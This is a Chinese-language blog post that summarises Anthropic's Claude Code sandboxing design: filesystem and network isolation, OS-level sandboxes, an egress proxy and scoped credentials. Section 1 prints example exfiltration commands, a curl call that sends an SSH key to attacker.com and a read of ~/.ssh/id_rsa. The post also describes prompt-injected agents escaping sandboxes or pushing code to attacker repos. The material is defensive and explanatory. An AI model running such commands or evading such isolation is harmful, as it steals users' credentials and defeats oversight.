---
title: Claude Code 沙箱设计：文件系统 + 网络双重隔离的 5 个工程模式
date: 2026-09-15
tags: [Claude, AI 工程, 安全, Sandbox]
summary: 把 Anthropic Claude Code Sandboxing 工程文章拆成 5 个工程模式：filesystem + network 双隔离缺一不可、OS 级 sandbox（bubblewrap / seatbelt）替代容器方案、proxy 化网络访问、scoped credential + 内容校验、Claude Code on the web 的 cloud sandbox。配数据（permission prompt 降 84%）+ 落地配置 + 面试可讲的安全模型取舍。
source-url: https://www.anthropic.com/engineering/claude-code-sandboxing
source-title: Sandboxing in Claude Code
source-author: David Dworken, Oliver Weller-Davies (Anthropic)
---

## 引子

Claude Code 的默认权限模型是 read-only + 每次操作弹审批——结果和 Auto Mode 文章里一样的真相：**用户最终会点"是"不管内容**。Anthropic 的解法不是更好的 prompt，是**OS 级沙箱**——文件系统 + 网络双重隔离，**permission prompt 砍 84%**，**没有容器开销**。这是 2025 年 AI Agent 安全的**真正基建级**进步——**bubblewrap / seatbelt 直接做**，不是 Docker in Docker。

下面拆 5 个工程模式，按"**为什么单隔离不够 → OS 级 sandbox → 网络 proxy → 凭证隔离 → 云端 sandbox**"递进。

---

## 1. 双隔离缺一不可：filesystem + network 是 AND 不是 OR

**一行定位**：**单做 filesystem 隔离 = 假安全**——agent 能逃出 sandbox 拿网络；**单做 network 隔离 = 假安全**——agent 能 exfil SSH keys。

**Anthropic 的安全模型**：
- **Filesystem isolation**：Claude 只能读 / 写白名单目录（一般是当前 working dir + 配置里 allow 的 path）。**任何写入 `/etc/passwd` / `~/.ssh/` / 外部 repo 的尝试被立刻拦截 + 通知**。
- **Network isolation**：所有 outbound 流量走 unix domain socket → 外部 proxy。**Proxy 检查目标域名是否在白名单**，不在就 block / 弹 confirm。
- **两者都做才有意义**：filesystem 拦 SSH key 被偷，network 拦 key 被发出。

**Anthropic 的原话**：
> "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys; without filesystem isolation, a compromised agent could easily escape the sandbox and gain network access."

**面试可讲的角度**：这是 *defense in depth* 在 agent 系统的落地。**单一防御必然被绕过**——filesystem 隔离有 edge case（路径穿越、symlink trick），network 隔离有 edge case（DNS rebinding、proxy bypass）。**两层独立 + 同时存在 = 任一层单独不完美，乘起来仍然安全**。

**工程落地**：
- ☐ **不要只做 filesystem 隔离**——agent `curl http://attacker.com/steal?key=$SSH` 你拦不住
- ☐ **不要只做 network 隔离**——agent `cat ~/.ssh/id_rsa` 然后写到 working dir 你看不见
- ☐ **Filesystem 必须有 default deny**——allowlist working dir，**其它默认禁止**
- ☐ **Network 必须 default deny**——白名单已批准域名，新域名弹 confirm

---

## 2. OS 级 Sandbox：bubblewrap / seatbelt 替代容器

**一行定位**：**不要用 Docker 做 agent sandbox**——**用 Linux bubblewrap / macOS seatbelt**——零容器开销，原生 OS 隔离。

**Anthropic 的设计**：
- **Linux**：`bubblewrap`（bwrap）——单二进制，按 namespace 创建临时 root，挂载白名单目录。
- **macOS**：`seatbelt`（内核 sandbox 扩展）——Apple 原生的 process-level sandbox。
- **不用 Docker / Podman**——这些是 VM-level，启动慢，资源重，**对一个交互式 CLI agent 过度**。
- **覆盖 subprocess**——任何 Claude 启动的脚本、子进程、MCP server 都受 sandbox 约束（**不是只拦 Claude 自己**）。

**面试可讲的角度**：这是 *least privilege applied to OS primitives*。**每个 Linux 进程本来就有 namespace 能力**（mount / network / PID / IPC），bubblewrap 直接用——**不需要 container 引擎做这件事**。**容器是给"装一整个 Linux 服务"用的，agent sandbox 是给"限制一个进程"用的**。

**工程落地**：
- ☐ **优先用 OS-level sandbox**——bwrap / seatbelt 启动 < 100ms，无 image pull
- ☐ **只在你必须隔离 multi-tenant 时用 Docker / gVisor / Firecracker**——开销大但隔离强
- ☐ **Sandbox 必须递归**——subprocess 也受约束，**不要相信"agent 自己是 safe 的"**
- ☐ **Anthropic 开源了 sandbox runtime**——https://github.com/anthropics/claude-code-sandbox 可以参考

---

## 3. 网络 Proxy：unix socket + 域名白名单

**一行定位**：**让所有 outbound 流量走外部 proxy**——**sandbox 内不可信，proxy 外可信**，**白名单 + 内容校验都在 proxy**。

**Anthropic 的实现**：
- Sandbox 内进程只能通过 **unix domain socket** 连 proxy，**不能直接用网络栈**。
- Proxy 跑在 sandbox 外，**验证**：
  - 目标域名是否在白名单（GitHub / npm / PyPI / internal registry / etc.）
  - 协议是否允许（HTTP / HTTPS / gRPC）
  - 流量大小限制
- **新域名弹 confirm**——用户可以临时允许。

**好处**：
- **Proxy 是 single chokepoint**——所有流量一处的审计 + 限制
- **Network namespace 隔离 + proxy 业务逻辑**双层防御
- **Custom proxy 支持任意规则**——例如 "禁止任何 POST 到 *.example.com"

**面试可讲的角度**：这是 *service mesh sidecar pattern*——**Istio / Linkerd 把网络流量劫持到 sidecar 做 policy enforcement，agent sandbox 把网络流量劫持到外部 proxy 做同样事**。**不是 agent 自己管网络，是外部进程代管**。

**工程落地 checklist**：
- ☐ **Sandbox 内进程用 unix socket，不是 TCP**——**sandbox 里 TCP 应该是禁止的**
- ☐ **Proxy 在 sandbox 外**，进程不可信是 sandbox 内的，proxy 是可信的
- ☐ **域名白名单 = allowlist + 新域名 confirm**——而不是 deny list（容易被绕过）
- ☐ **TLS 终止在 proxy**——sandbox 内进程不直接做 TLS，**避免证书伪造**
- ☐ **记 audit log**——所有 outbound 流量、目标、大小、结果**进 SIEM**

---

## 4. Scoped Credential：Git 凭证不出 sandbox

**一行定位**：**Token 永远不进 sandbox**——**sandbox 用 scoped credential 调外部 proxy，proxy 验内容后挂真 token**。

**Anthropic 的设计**（Git 为例）：
- Sandbox 内 git client → **scoped credential**（只能推送到配置好的 branch）
- 外部 proxy **验证 credential + git 命令内容**（如 `git push origin main` 是否只 push 到 main）
- 验证通过 → proxy **挂上真 GitHub token** → 转发到 GitHub

**关键约束**：
- 真 GitHub token **从不在 sandbox 里**——**任何路径都拿不到**。
- 凭证粒度很细：scoped credential 不能推 main / 不能 force push / 不能 push 到非配置 repo。
- 即使 agent 被 prompt injection hijack 想 push 到 attacker repo，**proxy 看到目标不对就拒**。

**面试可讲的角度**：这是 *credential isolation by design*——传统 dev workflow 把 GitHub token 放在 `~/.netrc` / `~/.gitconfig`，被 prompt injection 直接读。**Scoped credential 是"零信任"的 git 版**——**token 不能从它应该用的地方被搬到别的地方**。

**工程落地**：
- ☐ **任何 secret 都走 proxy**——API keys / DB passwords / signing keys，**never in sandbox env vars**
- ☐ **Scoped credential per task**——一次性、限范围、可吊销
- ☐ **Proxy 验证命令内容**——不只是看 credential，**还看 action**（防止 credential 本身合法但 action 危险）
- ☐ **Force push / pull secret / push to non-allowed repo** 都该 block

---

## 5. Claude Code on the Web：Cloud Sandbox

**一行定位**：**当用户的本地环境太敏感时**——**跑在 cloud sandbox 里，credentials 由 proxy 持有**。

**Anthropic 的设计**：
- 每个 web session = 一个独立 cloud sandbox。
- 凭证（git credentials / signing keys）**永远不在 sandbox 里**。
- Git proxy 透明转发所有 git 操作（push / pull / clone）——**用户不用感知**。
- 即使 cloud sandbox 整个被攻破，**user 的真凭证没泄露**。

**使用场景**：
- **敏感 repo 在 corporate 内网**——本地 dev 太麻烦，cloud sandbox + proxy 配 corporate VPN 即可。
- **PR review / quick fix**——5 分钟的任务不想 clone 整个 repo。
- **教新人 codebase**——cloud sandbox 临时环境，干完即扔。

**面试可讲的角度**：这是 *ephemeral environment* 的应用——**临时 + 隔离 + 凭证安全**是 cloud sandbox 的三大优势。**本地 dev environment 是"长寿 + 易污染"，cloud sandbox 是"短寿 + 干净"**。

**工程落地**：
- ☐ **Cloud sandbox 必须 ephemeral**——session 结束销毁，**不留任何 state**
- ☐ **Network egress 走 corporate proxy**——和本地 sandbox 同样约束
- ☐ **Code 从 git clone，每次新 session 重新 clone**——不缓存任何 user content
- ☐ **Resource quota**——CPU / memory / network 都有上限，**防止 runaway agent**

---

## 数据收益

| 指标 | Before（手动审批） | After（sandbox） | 改进 |
|---|---|---|---|
| Permission prompts / session | 100% | 16% | **降 84%** |
| 安全（prompt injection 成功率） | 中 | 高 | filesystem + network 双拦截 |
| 用户体验 | "approve 疲劳" | 流畅 | 减少中断 |
| 启动开销 | 0 | < 100ms | bubblewrap 启动 |
| 凭证安全 | 在 sandbox 内 | proxy 外 | 永不出 sandbox |

**面试可讲的角度**：**安全设计的目标是"既更安全又更方便"——不是 trade-off**。**Anthropic 的 sandbox 同时降 84% prompt + 提升安全**——证明好的安全设计 = 减摩擦，**不是加摩擦**。

---

## 一句话总结

Claude Code 沙箱的核心论点是**双隔离是必须的，OS 级 sandbox 比容器轻，凭证永远出不了 sandbox 边界**。**filesystem + network 双拦截、bubblewrap/seatbelt 替代 Docker、scoped credential + 内容校验 proxy**——这三层组合让 84% 的审批弹窗消失 + 真凭证永不进 sandbox。**好的安全设计是减摩擦，不是加摩擦**。

## 配套阅读

- **同主题**：auto-mode-defense-architecture — reasoning-blind classifier 是 sandbox 之外的第二层
- **架构视角**：managed-agents-arch-patterns — session / harness / sandbox 三层解耦
- **执行机制**：code-execution-with-mcp — code execution 的 sandbox 设计参考

参考资料：

- [Sandboxing in Claude Code](https://www.anthropic.com/engineering/claude-code-sandboxing) — David Dworken, Oliver Weller-Davies, Anthropic
- [Anthropic sandbox runtime (open source)](https://github.com/anthropics/claude-code-sandbox) — bubblewrap / seatbelt 实现参考
- [Auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode) — sandbox 之外的 AI 层防御